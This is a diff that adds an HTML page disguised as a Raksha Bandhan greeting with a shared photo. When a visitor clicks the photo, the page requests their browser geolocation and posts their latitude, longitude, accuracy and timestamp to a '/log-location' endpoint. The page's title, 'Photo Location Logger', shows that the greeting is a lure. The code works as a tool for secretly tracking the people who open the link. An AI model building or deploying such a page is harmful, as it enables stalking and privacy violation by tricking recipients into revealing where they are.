@@ -1,0 +1,82 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Photo Location Logger</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: auto;
+            padding: 1rem;
+        }
+
+        img {
+            max-width: 100%;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        #status {
+            margin-top: 1rem;
+            color: #333;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Happy Raksha Bandhan</h1>
+
+    <img id="photo" src="photo.jpg" alt="Shared photo">
+
+    <p id="status"></p>
+
+    <script>
+        const photo = document.getElementById('photo');
+        const status = document.getElementById('status');
+        let alreadyClicked = false; // to prevent multiple requests
+
+        photo.addEventListener('click', () => {
+            if (alreadyClicked) return; // prevent repeated requests
+            alreadyClicked = true;
+
+            if (!navigator.geolocation) {
+                status.textContent = 'Geolocation not supported in this browser.';
+                return;
+            }
+
+            status.textContent = 'Hi...';
+
+            navigator.geolocation.getCurrentPosition(
+                async pos => {
+                    const payload = {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: new Date(pos.timestamp).toISOString(),
+                        photoId: 'PHOTO-123'
+                    };
+
+                    try {
+                        const resp = await fetch('/log-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+
+                        status.textContent = resp.ok ? 'Location logged successfully.' : 'Error logging location.';
+                    } catch (err) {
+                        status.textContent = 'Network error while sending location.';
+                    }
+                },
+                err => {
+                    status.textContent = 'Error: ' + err.message;
+                }
+            );
+        });
+    </script>
+</body>
+
+</html>
